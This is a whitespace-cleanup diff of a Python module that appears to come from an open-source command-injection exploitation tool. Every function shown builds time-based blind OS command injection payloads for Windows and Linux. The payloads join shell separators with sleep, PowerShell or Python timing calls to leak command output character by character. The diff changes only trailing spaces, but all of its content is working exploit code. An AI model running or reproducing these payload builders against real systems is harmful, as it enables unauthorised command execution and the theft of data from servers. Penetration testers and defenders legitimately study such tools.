@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -30,28 +30,28 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       pipe = "|"
       payload = (pipe +
                  "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
-                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                  "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  
+      payload = (ampersand +
                  "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
-                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                  "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
   else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
+      payload = (separator +
+                 "str=$(echo " + TAG + ")" + separator +
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator +
+                 "then sleep 0" + separator +
+                 "else sleep " + str(timesec) + separator +
                  "fi"
                  )
 
@@ -59,12 +59,12 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0 " + separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
+      payload = (ampersand +
+                 "sleep 0 " + separator +
+                 "str=$(echo " + TAG + ")" + separator +
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 "[ " + str(output_length) + " -eq $str1 ]" + separator +
                  "sleep " + str(timesec)
                  )
       separator = _urllib.parse.unquote(separator)
@@ -72,10 +72,10 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(output_length) + " -ne $(echo " + TAG + settings.SINGLE_WHITESPACE + 
-                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
+                 "[ " + str(output_length) + " -ne $(echo " + TAG + settings.SINGLE_WHITESPACE +
+                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator +
                  "sleep " + str(timesec)
-                 )  
+                 )
     else:
       pass
 
@@ -89,43 +89,43 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE +  
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
-  else:  
+  else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
+      payload = (separator +
                  # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
+                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator +
+                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
+                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                  "fi "
                  )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
                  # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
-                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
+                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator +
+                 "[ " + str(output_length) + " -eq ${str1} ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                  )
       #if menu.options.data:
@@ -135,9 +135,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
       pipe = "|"
       payload = (pipe +
                  # Find the length of the output, using readline().
-                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + separator + 
+                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
-                 ) 
+                 )
     else:
       pass
 
@@ -150,7 +150,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
     else:
       if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
-        
+
   return payload
 
 """
@@ -160,56 +160,56 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                cmd +
+                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
+                cmd +
+                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-  else: 
+  else:
     settings.USER_SUPPLIED_CMD = cmd
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
-                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
-                 #"str1=${%23str}" + separator + 
+      payload = (separator +
+                 "str=\"$(echo $(" + cmd + "))\"" + separator +
+                 #"str1=${%23str}" + separator +
                  "str1=$(expr length \"$str\")" + separator +
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator +
+                 "then sleep 0" + separator +
+                 "else sleep " + str(timesec) + separator +
                  "fi "
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0" + separator + 
+      payload = (ampersand +
+                 "sleep 0" + separator +
                  "str=$(echo $(" + cmd + "))" + separator +
                  # Find the length of the output.
                  "str1=$(expr length $str)" + separator +
-                 #"str1=${%23str}  " + separator + 
-                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 #"str1=${%23str}  " + separator +
+                 "[ " + str(output_length) + " -eq $str1 ]" + separator +
                  "sleep " + str(timesec)
                  )
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
-        
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " +str(output_length)+ " -ne $(echo -n \"$(" + cmd + ")\" " + 
-                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
+                 "[ " +str(output_length)+ " -ne $(echo -n \"$(" + cmd + ")\" " +
+                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +
                  "sleep " + str(timesec)
                  )
     else:
@@ -224,42 +224,42 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd + 
+                cmd +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd + 
+                cmd +
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
-  else: 
+  else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
+      payload = (separator +
                  # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
+                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator +
+                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
+                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                  "fi "
                  )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator + 
+      payload = (ampersand +
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                  # Find the length of the output, using readline().
-                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
-                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
+                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator +
+                 "[ " + str(output_length) + " -eq ${str1} ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                  )
       #if menu.options.data:
@@ -269,9 +269,9 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       pipe = "|"
       payload = (pipe +
                  # Find the length of the output, using readline().
-                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\") ] " + separator + 
+                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\") ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
-                 ) 
+                 )
     else:
       pass
 
@@ -292,29 +292,29 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
+      payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-  else: 
+  else:
     settings.USER_SUPPLIED_CMD = cmd
     if separator == ";" or separator == "%0a" :
-      payload = (separator + 
+      payload = (separator +
                 # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator +       
+                "cmd=\"$(echo $(" + cmd + "))\"" + separator +
                 # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
+                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator +
                 # Transform from Ascii to Decimal.
                 "str=$(printf '%d' \"'$char'\")" + separator +
                 # Perform the time-based comparisons
@@ -327,16 +327,16 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                "sleep 0 " + separator + 
+      payload = (ampersand +
+                "sleep 0 " + separator +
                 # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator + 
+                "cmd=\"$(echo $(" + cmd + "))\"" + separator +
                 # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
+                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator +
                 # Transform from Ascii to Decimal.
                 "str=$(printf '%d' \"'$char'\")" + separator +
                 # Perform the time-based comparisons
-                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
+                "[ " + str(ascii_char) + " -eq ${str} ] " + separator +
                 "sleep " + str(timesec)
                 )
       #if menu.options.data:
@@ -345,11 +345,11 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne $(" + cmd + pipe + "tr -d '\\n'" + 
-                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + 
-                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator + 
+                "[ " + str(ascii_char) + " -ne $(" + cmd + pipe + "tr -d '\\n'" +
+                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
+                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator +
                 "sleep " + str(timesec)
-                )  
+                )
     else:
       pass
 
@@ -363,41 +363,41 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE +  
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE + 
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE +   
-                "for /f \"tokens=*\" %i in ('cmd /c " + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE + 
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
-                
+
                 )
-  else: 
+  else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
+      payload = (separator +
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
+                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                  "fi "
                  )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator + 
-                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
+      payload = (ampersand +
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
+                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
+                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                  )
       #if menu.options.data:
@@ -406,10 +406,10 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator + 
+                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                  )
-      
+
     else:
       pass
 
@@ -431,52 +431,52 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
+                cmd +
+                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
+                cmd +
+                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
   else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
-                 "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
+      payload = (separator +
+                 "str=\"$(" + cmd + ")\"" + separator +
+                 "if [ " + str(ascii_char) + " -ne $str ]" + separator +
+                 "then sleep 0" + separator +
+                 "else sleep " + str(timesec) + separator +
                  "fi "
                  )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0 " + separator + 
-                 "str=\"$(" + cmd + ")\" " + separator + 
-                 "[ " + str(ascii_char) + " -eq $str ] " + separator + 
+      payload = (ampersand +
+                 "sleep 0 " + separator +
+                 "str=\"$(" + cmd + ")\" " + separator +
+                 "[ " + str(ascii_char) + " -eq $str ] " + separator +
                  "sleep " + str(timesec)
                  )
-      
+
       #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " -ne \"$(" + cmd + ")\" ] " + separator + 
+                 "[ " + str(ascii_char) + " -ne \"$(" + cmd + ")\" ] " + separator +
                  "sleep " + str(timesec)
-                 )  
+                 )
     else:
       pass
 
@@ -489,9 +489,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
-      payload = (pipe + settings.SINGLE_WHITESPACE + 
+      payload = (pipe + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd + 
+                cmd +
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                 )
@@ -499,29 +499,29 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + settings.SINGLE_WHITESPACE + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd + 
+                cmd +
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                 )
-  else: 
+  else:
     if separator == ";" or separator == "%0a":
-      payload = (separator + 
+      payload = (separator +
                  "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
                  "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
+                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator +
+                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator +
                  "fi "
                  )
 
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator + 
-                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
+      payload = (ampersand +
+                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator +
+                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
+                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                  )
       #if menu.options.data:
@@ -530,10 +530,10 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\") ] " + separator + 
+                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\") ] " + separator +
                  "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                  )
-      
+
     else:
       pass
 
